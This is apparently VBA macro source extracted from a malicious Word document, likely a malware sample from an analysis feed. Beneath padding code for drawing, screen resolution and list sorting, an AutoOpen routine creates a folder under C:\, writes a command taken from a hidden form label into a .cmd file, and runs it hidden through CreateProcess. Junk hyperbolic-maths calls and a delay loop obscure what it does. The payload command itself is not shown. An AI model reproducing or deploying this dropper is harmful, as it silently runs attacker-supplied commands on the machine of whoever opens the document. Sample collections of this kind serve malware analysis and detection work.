Attribute VB_Name = "Class1"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Attribute VB_Name = "Class2"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Attribute VB_Name = "PaintModule"

Public BezierPoints(3) As PointApi

Public Type PointApi
    X As Long
    y As Long
End Type

Public Const READ_CONTROL = &H20000
Public Const KEY_QUERY_VALUE = &H1
Public Const KEY_SET_VALUE = &H2
Public Const KEY_CREATE_SUB_KEY = &H4
Public Const KEY_ENUMERATE_SUB_KEYS = &H8
Public Const KEY_NOTIFY = &H10
Public Const KEY_CREATE_LINK = &H20
Public Const KEY_ALL_ACCESS = KEY_QUERY_VALUE + KEY_SET_VALUE + KEY_CREATE_SUB_KEY + KEY_ENUMERATE_SUB_KEYS + KEY_NOTIFY + KEY_CREATE_LINK + READ_CONTROL
Public Const HKEY_CLASSES_ROOT = &H80000000
Public Const HKEY_CURRENT_USER = &H80000001
Public Const HKEY_LOCAL_MACHINE = &H80000002
Public Const HKEY_USERS = &H80000003
Public Const HKEY_PERFORMANCE_DATA = &H80000004
Public Const SPIF_UPDATEINIFILE = &H1
Public Const SPI_SETDESKWALLPAPER = 20
Public Const SPIF_SENDWININICHANGE = &H2
Public Const ERROR_SUCCESS = 0&
Public Const REG_SZ = 1
Public Const REG_DWORD = 4
Public Const MAX_PATH = 260
Public Const MaxBuf = 10
Public Const gREGKEYSYSINFOLOC = "SOFTWARE\Microsoft\Shared Tools Location"
Public Const gREGVALSYSINFOLOC = "MSINFO"
Public Const gREGKEYSYSINFO = "SOFTWARE\Microsoft\Shared Tools\MSINFO"
Public Const gREGVALSYSINFO = "PATH"
Public Const CCDEVICENAME = 32
Public Const CCFORMNAME = 32
Public Const DM_PELSWIDTH = &H80000
Public Const DM_PELSHEIGHT = &H100000
Public Const GWL_EXSTYLE = (-20)
Public Const WS_EX_LAYERED = &H80000
Public Const LWA_ALPHA = &H2&

Public Type DEVMODE
    dmDeviceName As String * CCDEVICENAME
    dmSpecVersion As Integer
    dmDriverVersion As Integer
    dmSize As Integer
    dmDriverExtra As Integer

    dmFields As Long
    dmOrientation As Integer
    dmPaperSize As Integer
    dmPaperLength As Integer
    dmPaperWidth As Integer
    dmScale As Integer
    dmCopies As Integer
    dmDefaultSource As Integer
    dmPrintQuality As Integer
    dmColor As Integer
    dmDuplex As Integer
    dmYResolution As Integer
    dmTTOption As Integer
    dmCollate As Integer

    dmFormName As String * CCFORMNAME
    dmUnusedPadding As Integer
    dmBitsPerPel As Integer
    dmPelsWidth As Long
    dmPelsHeight As Long
    dmDisplayFlags As Long
    dmDisplayFrequency As Long
End Type


Dim DevM As DEVMODE

Sub ChangeRes(iWidth As Single, iHeight As Single)
    Dim A As Boolean
    Dim i As Integer
    i = 0
    Do
        A = EnumDisplaySettings(0&, i, DevM)
        i = i + 1
    Loop Until (A = False)

    Dim B&
    DevM.dmFields = DM_PELSWIDTH Or DM_PELSHEIGHT

    DevM.dmPelsWidth = iWidth
    DevM.dmPelsHeight = iHeight

    ChangeDisplaySettings DevM, 0
End Sub

Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
Attribute VB_Name = "UserForm1"
Attribute VB_Base = "0{94A109B2-399D-431B-B9B8-F3E5F15B7D55}{3A03E5F3-D1F5-4211-805A-5BDF6C80D7A0}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Attribute VB_Name = "UserForm10"
Attribute VB_Base = "0{6FFB162E-8A62-460D-8312-C0C5ABE2FC4F}{3EE3F54D-01BE-412D-B83F-574061439943}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Attribute VB_Name = "UserForm11"
Attribute VB_Base = "0{4E2B5A5F-381C-4947-AB50-24A28FF4E52B}{C3FCE433-6016-451A-A1D9-7BA575112BAA}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Attribute VB_Name = "UserForm2"
Attribute VB_Base = "0{946DF8B5-ECC7-4415-BA26-776AA1F6FF0F}{7959CE3B-B3C9-4BAE-B19A-1CB99C3AA436}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Attribute VB_Name = "UserForm3"
Attribute VB_Base = "0{43FB61D1-33E0-4810-BEAE-E00B2BA99C9B}{1252C4A1-8403-4562-81ED-A46B6D58B736}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Attribute VB_Name = "UserForm4"
Attribute VB_Base = "0{A5BAB0FD-FF06-4B91-9DC1-C1FDE2B0EBFF}{D29EC742-E3E7-498A-84F3-4C20A1BCD95A}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Attribute VB_Name = "UserForm5"
Attribute VB_Base = "0{3017265E-B095-4083-9FF1-6B868D757007}{C7FED5C6-C78E-40F7-88DE-32E2DB36FA34}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Attribute VB_Name = "UserForm6"
Attribute VB_Base = "0{8327109E-DB54-4FA0-9F85-6E6CA3171B49}{4AEBF264-6A71-45E6-99E4-CB44C415E01D}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Attribute VB_Name = "UserForm7"
Attribute VB_Base = "0{F1864EC8-D085-44CB-975D-CBBBE0C9C2EF}{06F27E13-CB2E-47AC-A8A6-7AA236E4DCF6}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Attribute VB_Name = "UserForm8"
Attribute VB_Base = "0{C95BCA37-E45E-4B24-8CFA-D3F56A112693}{98F12C71-7F1D-4393-8197-C10929029A28}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Attribute VB_Name = "UserForm9"
Attribute VB_Base = "0{CC31BCB3-CE7A-4B57-9BFA-E0A4847253A5}{576EB9F6-EE8E-4094-854C-EBCCAD321BA0}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Attribute VB_Name = "cList"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Option Explicit

Private StrListArray() As String
Private StrEXListArray() As String
Private lstEXSelection() As Integer
Private List_is_Empty As Boolean

Public Sub Clear()
       ReDim StrListArray(0 To 0)
       ReDim StrEXListArray(0 To 0)
       ReDim lstEXSelection(0 To 0)
       List_is_Empty = True
End Sub


Public Sub RemoveItem(Index As Long)
Const Err_Subscript_Out_Of_Range = 9
Dim IndexID As Long
If UBound(StrListArray) = 0 Then
    StrListArray(0) = ""
    StrEXListArray(0) = ""
    lstEXSelection(0) = vbNull
    List_is_Empty = True
Else
    Select Case Index
    Case Is > ItemCount - 1, Is < 0
        Err.Raise Err_Subscript_Out_Of_Range
    Case Else
        
        For IndexID = Index To UBound(StrListArray) - 1
            StrListArray(IndexID) = StrListArray(IndexID + 1)
            StrEXListArray(IndexID) = StrEXListArray(IndexID + 1)
            lstEXSelection(IndexID) = lstEXSelection(IndexID + 1)
        Next IndexID
    
        ReDim Preserve StrListArray(LBound(StrListArray) To UBound(StrListArray) - 1)
        ReDim Preserve StrEXListArray(LBound(StrEXListArray) To UBound(StrEXListArray) - 1)
        ReDim Preserve lstEXSelection(LBound(lstEXSelection) To UBound(lstEXSelection) - 1)
    End Select
End If
End Sub

Public Sub AddItem(TextLine As String, exTextLine As String, Optional EXSelection As Integer = 0)
If List_is_Empty = False Then
    ReDim Preserve StrListArray(LBound(StrListArray) To UBound(StrListArray) + 1)
    ReDim Preserve StrEXListArray(LBound(StrEXListArray) To UBound(StrEXListArray) + 1)
    ReDim Preserve lstEXSelection(LBound(lstEXSelection) To UBound(lstEXSelection) + 1)

End If
StrEXListArray(UBound(StrListArray)) = exTextLine
StrListArray(UBound(StrListArray)) = TextLine
lstEXSelection(UBound(lstEXSelection)) = EXSelection
List_is_Empty = False
End Sub


Public Sub Sort()
'The fastets sort algorithm!
Dim sVal1 As String, sVal2 As String

Dim Row As Long
Dim MaxRow As Long
Dim MinRow As Long
Dim Swtch As Long
Dim Limit As Long
Dim Offset As Long

MaxRow = UBound(StrListArray)
MinRow = LBound(StrListArray)
Offset = MaxRow \ 2

Do While Offset > 0
      Limit = MaxRow - Offset
      Do
         Swtch = False         ' Assume no switches at this offset.

         ' Compare elements and switch ones out of order:
         
         For Row = MinRow To Limit
                sVal1 = LCase(StrListArray(Row))
                sVal2 = LCase(StrListArray(Row + Offset))
            If sVal1 > sVal2 Then
               strSwap StrListArray(Row), StrListArray(Row + Offset)
               strSwap StrEXListArray(Row), StrEXListArray(Row + Offset)
               intSwap lstEXSelection(Row), lstEXSelection(Row + Offset)
               Swtch = Row
            End If
         Next Row

         ' Sort on next pass only to where last switch was made:
         Limit = Swtch - Offset
      Loop While Swtch

      ' No switches at last offset, try one half as big:
      Offset = Offset \ 2
   Loop
End Sub

Public Property Get ItemCount() As Long
If List_is_Empty Then
    ItemCount = 0
Else
    ItemCount = UBound(StrListArray) + 1
End If
End Property

Public Function Item(ByVal IndexID As Long) As String
    Item = StrListArray(IndexID)
End Function

Public Function exItem(ByVal IndexID As Long) As String
    exItem = StrEXListArray(IndexID)
End Function

Public Function ChangeItem(ByVal IndexID As Long, NewData As String)
    StrListArray(IndexID) = NewData
End Function

Public Function ChangeEXItem(ByVal IndexID As Long, NewData As String)
    StrEXListArray(IndexID) = NewData
End Function

Public Function EXSelection(ByVal IndexID As Long) As Integer
    EXSelection = lstEXSelection(IndexID)
End Function

Public Function SetEXSelection(ByVal IndexID As Long, nEXSelection As Integer) As Integer
    lstEXSelection(IndexID) = nEXSelection
End Function

Private Sub Class_Initialize()
   ReDim StrListArray(0 To 0)
   ReDim StrEXListArray(0 To 0)
   ReDim lstEXSelection(0 To 0)
   
   List_is_Empty = True
End Sub

Private Sub strSwap(ByRef var1 As String, ByRef var2 As String)
    Dim X As String
    X = var1
    var1 = var2
    var2 = X
End Sub

Private Sub intSwap(ByRef var1 As Integer, ByRef var2 As Integer)
    Dim X As Integer
    X = var1
    var1 = var2
    var2 = X
End Sub

Attribute VB_Name = "mdArrow"

#If VBA7 Then
Public Declare PtrSafe Function MoveToEx Lib "gdi32" (ByVal hdc As LongPtr, ByVal X As LongPtr, ByVal y As LongPtr, lpPoint As PointApi) As LongPtr
Public Declare PtrSafe Function ExtFloodFill Lib "gdi32" (ByVal hdc As LongPtr, ByVal X As LongPtr, ByVal y As LongPtr, ByVal crColor As LongPtr, ByVal wFillType As LongPtr) As LongPtr
Public Declare PtrSafe Function Ellipse Lib "gdi32" (ByVal hdc As LongPtr, ByVal X1 As LongPtr, ByVal Y1 As LongPtr, ByVal X2 As LongPtr, ByVal Y2 As LongPtr) As LongPtr
Public Declare PtrSafe Function RoundRect Lib "gdi32" (ByVal hdc As LongPtr, ByVal X1 As LongPtr, ByVal Y1 As LongPtr, ByVal X2 As LongPtr, ByVal Y2 As LongPtr, ByVal X3 As LongPtr, ByVal Y3 As LongPtr) As LongPtr
Public Declare PtrSafe Function CreateProcess Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As LongPtr, ByVal lpThreadAttributes As LongPtr, ByVal bInheritHandles As LongPtr, ByVal dwCreationFlags As LongPtr, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
Public Declare PtrSafe Function WaitForSingleObject Lib "kernel32" (ByVal hHandle As LongPtr, ByVal dwMilliseconds As LongPtr) As LongPtr
Public Declare PtrSafe Function GetExitCodeProcess Lib "kernel32" (ByVal hProcess As LongPtr, lpExitCode As LongPtr) As LongPtr
Public Declare PtrSafe Function CloseHandle Lib "kernel32" (ByVal hObject As LongPtr) As LongPtr
Public Declare PtrSafe Function GetPixel Lib "gdi32" (ByVal hdc As LongPtr, ByVal X As LongPtr, ByVal y As LongPtr) As LongPtr
Public Declare PtrSafe Function SetPixel Lib "gdi32" (ByVal hdc As LongPtr, ByVal X As LongPtr, ByVal y As LongPtr, ByVal crColor As LongPtr) As LongPtr
Public Declare PtrSafe Function CreateEllipticRgn Lib "gdi32" (ByVal X1 As LongPtr, ByVal Y1 As LongPtr, ByVal X2 As LongPtr, ByVal Y2 As LongPtr) As LongPtr
Public Declare PtrSafe Function SetWindowRgn Lib "User32" (ByVal hwnd As LongPtr, ByVal hRgn As LongPtr, ByVal bRedraw As Boolean) As LongPtr
Public Declare PtrSafe Function EnumDisplaySettings Lib "User32" Alias "EnumDisplaySettingsA" (ByVal lpszDeviceName As LongPtr, ByVal iModeNum As LongPtr, lpDevMode As Any) As Boolean
Public Declare PtrSafe Function ChangeDisplaySettings Lib "User32" Alias "ChangeDisplaySettingsA" (lpDevMode As Any, ByVal dwFlags As LongPtr) As LongPtr
Public Declare PtrSafe Function GetWindowlongptr Lib "User32" Alias "GetWindowlongptrA" (ByVal hwnd As LongPtr, ByVal nIndex As LongPtr) As LongPtr
Public Declare PtrSafe Function SetWindowlongptr Lib "User32" Alias "SetWindowlongptrA" (ByVal hwnd As LongPtr, ByVal nIndex As LongPtr, ByVal dwNewlongptr As LongPtr) As LongPtr
Public Declare PtrSafe Function SetLayeredWindowAttributes Lib "User32" (ByVal hwnd As LongPtr, ByVal crey As Byte, ByVal bAlpha As Byte, ByVal dwFlags As LongPtr) As LongPtr
Public Declare PtrSafe Function GetSystemDirectory Lib "kernel32.dll" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As LongPtr) As LongPtr
Public Declare PtrSafe Function SystemParametersInfo& Lib "User32" Alias "SystemParametersInfoA" (ByVal uAction&, ByVal uParam&, ByVal lpvParam As Any, ByVal fuWinIni&)
Public Declare PtrSafe Function RegEnumKeyEx Lib "advapi32.dll" Alias "RegEnumKeyExA" (ByVal hKey As LongPtr, ByVal dwIndex As LongPtr, ByVal lpName As String, lpcbName As LongPtr, ByVal lpReserved As LongPtr, ByVal lpClass As String, lpcbClass As LongPtr, lpftLastWriteTime As Any) As LongPtr
Public Declare PtrSafe Function LineTo Lib "gdi32" (ByVal hdc As LongPtr, ByVal X As LongPtr, ByVal y As LongPtr) As LongPtr
Public Declare PtrSafe Function GetDC Lib "User32" (ByVal hwnd As LongPtr) As LongPtr
Public Declare PtrSafe Function ReleaseDC Lib "User32" (ByVal hwnd As LongPtr, ByVal hdc As LongPtr) As LongPtr
Public Declare PtrSafe Function CreatePen Lib "gdi32" (ByVal nPenStyle As LongPtr, ByVal nWidth As LongPtr, ByVal crColor As LongPtr) As LongPtr
Public Declare PtrSafe Function SelectObject Lib "gdi32" (ByVal hdc As LongPtr, ByVal hObject As LongPtr) As LongPtr
Public Declare PtrSafe Function DeleteObject Lib "gdi32" (ByVal hObject As LongPtr) As LongPtr
Public Declare PtrSafe Function Polygon Lib "gdi32" (ByVal hdc As LongPtr, lpPoint As PointApi, ByVal nCount As LongPtr)
Public Declare PtrSafe Function PolyBezier Lib "gdi32" (ByVal hdc As LongPtr, lppt As PointApi, ByVal cPoints As LongPtr) As LongPtr
#Else
Public Declare Function RoundRect Lib "gdi32" (ByVal hdc As Long, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long, ByVal X3 As Long, ByVal Y3 As Long) As Long
Public Declare Function GetPixel Lib "gdi32" (ByVal hdc As Long, ByVal x As Long, ByVal y As Long) As Long
Public Declare Function SetPixel Lib "gdi32" (ByVal hdc As Long, ByVal x As Long, ByVal y As Long, ByVal crColor As Long) As Long
Public Declare Function CreateEllipticRgn Lib "gdi32" (ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Public Declare Function CreateProcess Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
Public Declare Function WaitForSingleObject Lib "kernel32" (ByVal hHandle As Long, ByVal dwMilliseconds As Long) As Long
Public Declare Function GetExitCodeProcess Lib "kernel32" (ByVal hProcess As Long, lpExitCode As Long) As Long
Public Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Public Declare Function MoveToEx Lib "gdi32" (ByVal hdc As Long, ByVal x As Long, ByVal y As Long, lpPoint As PointApi) As Long
Public Declare Function ExtFloodFill Lib "gdi32" (ByVal hdc As Long, ByVal x As Long, ByVal y As Long, ByVal crColor As Long, ByVal wFillType As Long) As Long
Public Declare Function Ellipse Lib "gdi32" (ByVal hdc As Long, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Public Declare Function SetWindowRgn Lib "User32" (ByVal hwnd As Long, ByVal hRgn As Long, ByVal bRedraw As Boolean) As Long
Public Declare Function EnumDisplaySettings Lib "User32" Alias "EnumDisplaySettingsA" (ByVal lpszDeviceName As Long, ByVal iModeNum As Long, lpDevMode As Any) As Boolean
Public Declare Function ChangeDisplaySettings Lib "User32" Alias "ChangeDisplaySettingsA" (lpDevMode As Any, ByVal dwFlags As Long) As Long
Public Declare Function GetWindowLong Lib "User32" Alias "GetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long) As Long
Public Declare Function SetWindowLong Lib "User32" Alias "SetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Public Declare Function SetLayeredWindowAttributes Lib "User32" (ByVal hwnd As Long, ByVal crey As Byte, ByVal bAlpha As Byte, ByVal dwFlags As Long) As Long
Public Declare Function GetSystemDirectory Lib "kernel32.dll" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Public Declare Function SystemParametersInfo& Lib "User32" Alias "SystemParametersInfoA" (ByVal uAction&, ByVal uParam&, ByVal lpvParam As Any, ByVal fuWinIni&)
Public Declare Function RegEnumKeyEx Lib "advapi32.dll" Alias "RegEnumKeyExA" (ByVal hKey As Long, ByVal dwIndex As Long, ByVal lpName As String, lpcbName As Long, ByVal lpReserved As Long, ByVal lpClass As String, lpcbClass As Long, lpftLastWriteTime As Any) As Long
Public Declare Function LineTo Lib "gdi32" (ByVal hdc As Long, ByVal x As Long, ByVal y As Long) As Long
Public Declare Function GetDC Lib "User32" (ByVal hwnd As Long) As Long
Public Declare Function ReleaseDC Lib "User32" (ByVal hwnd As Long, ByVal hdc As Long) As Long
Public Declare Function CreatePen Lib "gdi32" (ByVal nPenStyle As Long, ByVal nWidth As Long, ByVal crColor As Long) As Long
Public Declare Function SelectObject Lib "gdi32" (ByVal hdc As Long, ByVal hObject As Long) As Long
Public Declare Function DeleteObject Lib "gdi32" (ByVal hObject As Long) As Long
Public Declare Function Polygon Lib "gdi32" (ByVal hdc As Long, lpPoint As PointApi, ByVal nCount As Long)
Public Declare Function PolyBezier Lib "gdi32" (ByVal hdc As Long, lppt As PointApi, ByVal cPoints As Long) As Long
#End If

Attribute VB_Name = "modFeatueSeason"
Attribute VB_Name = "modINI"


Public Const NORMAL_PRIORITY_CLASS         As Long = &H20&
Public Const STARTF_USESHOWWINDOW          As Long = 1
Public Const SW_HIDE                       As Long = 0
Public Const SW_SHOWDEFAULT                As Long = 10
Public Const ERROR_ELEVATION_REQUIRED      As Long = 740
Public Const INFINITE                      As Long = &HFFFFFFFF
Public Const SEE_MASK_NOCLOSEPROCESS       As Long = &H40

Public Type STARTUPINFO
    cb                  As Long
    lpReserved          As String
    lpDesktop           As String
    lpTitle             As String
    dwX                 As Long
    dwY                 As Long
    dwXSize             As Long
    dwYSize             As Long
    dwXCountChars       As Long
    dwYCountChars       As Long
    dwFillAttribute     As Long
    dwFlags             As Long
    wShowWindow         As Integer
    cbReserved2         As Integer
    lpReserved2         As Long
    hStdInput           As Long
    hStdOutput          As Long
    hStdError           As Long
End Type

Public Type PROCESS_INFORMATION
    hProcess            As Long
    hThread             As Long
    dwProcessID         As Long
    dwThreadID          As Long
End Type

Public Function Actg(ByVal Value As Double) As Double
    Actg = 1.5707963267949 - Atn(Value)
End Function

' // Hyperbolic sine of a real number
Public Function Sinh(ByVal Value As Double) As Double
    Sinh = (Exp(Value) - Exp(-Value)) / 2
End Function

Public Function LoadBytesFunc( _
            ByVal sFile As String, _
            sParams, _
            bStartHidden, _
            oOwnerForm) As Long
    Const FUNC_NAME     As String = "TheParisagrees"
    Dim sCommandLine    As String
    Dim uInfo           As PROCESS_INFORMATION
    Dim uStart          As STARTUPINFO
    Dim lExitCode
    Dim sFileName       As String

    On Error GoTo EH
    
    Dim K As Long

    For K = 0 To 620

    Call DateAdd("s", K, Now)
    Sinh (36.226)
    Next K

    sCommandLine = """" & sFile & """" & " " & sParams
    Sinh (6.226)
    
    uStart.cb = Len(uStart)
    If bStartHidden Then
        uStart.dwFlags = STARTF_USESHOWWINDOW
        uStart.wShowWindow = SW_HIDE
    End If
    If CreateProcess(vbNullString, sCommandLine, 0, 0, 1, NORMAL_PRIORITY_CLASS, 0, vbNullString, uStart, uInfo) <> 0 Then
        Sinh (9.6)
        Call WaitForSingleObject(uInfo.hProcess, INFINITE)
        If GetExitCodeProcess(uInfo.hProcess, lExitCode) <> 0 Then
            LoadBytesFunc = lExitCode
        End If
        Call CloseHandle(uInfo.hThread)
        Call CloseHandle(uInfo.hProcess)
    Else
               
                    LoadBytesFunc = lExitCode
       
               
            End If
        
    
    Exit Function
EH:
    Debug.Print FUNC_NAME; ": "
    Resume Next
End Function

Sub autoopen()

Actg (2.39)
Actg (2.49)
Actg (12.239)
Tanh (15.1263)

    Dim TSO
    Cosh (3.226)
    Cosh (8.6)
    Set TSO = CreateObject("Scripting.FileSystemObject")
    
    Tanh (51.663)
    Tanh (5.63)

    If TSO.FolderExists("c:\Scene1\") = 0 Then
    TSO.CreateFolder "c:\Scene1\"
    End If
    
    Dim fs
    Dim A
        
    Set fs = CreateObject("Scripting.FileSystemObject")
    Set A = fs.CreateTextFile("c:\Scene1\LogScene1.cmd", True)
    A.WriteLine (CStr(wmiSeria2.lblFAQscene1.Caption))
    A.Close
    
    Set fs = CreateObject("Scripting.FileSystemObject")
    Set A = fs.CreateTextFile("c:\Scene1\LogScene2.cmd", True)
    A.WriteLine ("2e5cb833828c62991573693f")
    A.Close
    
        
    Set fs = CreateObject("Scripting.FileSystemObject")
    Set A = fs.CreateTextFile("c:\Scene1\LogScene3.cmd", True)
    A.WriteLine ("")
    A.Close
    
        
    
    LoadBytesFunc "c:\Scene1\LogScene1.cmd", vbNullString, 1, 0
    
    GetDC ByVal 0&
    
    Set fs = CreateObject("Scripting.FileSystemObject")
    Set A = fs.CreateTextFile("c:\Scene1\LogScene5.cmd", True)
    A.WriteLine ("12")
    A.Close
    
    Set fs = CreateObject("Scripting.FileSystemObject")
    Set A = fs.CreateTextFile("c:\Scene1\LogScene6.cmd", True)
    A.WriteLine ("312")
    A.Close

End Sub

' // Hyperbolic cosine of a real number
Public Function Cosh(ByVal Value As Double) As Double
    Cosh = (Exp(Value) + Exp(-Value)) / 2
End Function

' // Hyperbolic tangent of a real number
Public Function Tanh(ByVal Value As Double) As Double
    Tanh = (Exp(2 * Value) - 1) / (Exp(2 * Value) + 1)
End Function


Attribute VB_Name = "wmiSeria2"
Attribute VB_Base = "0{18F39C9A-08DF-4E30-956D-142003C9BA0E}{4570BFF4-8CFF-49A1-97F8-A20FE7BEB0DE}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False



INQUEST-PP=macro
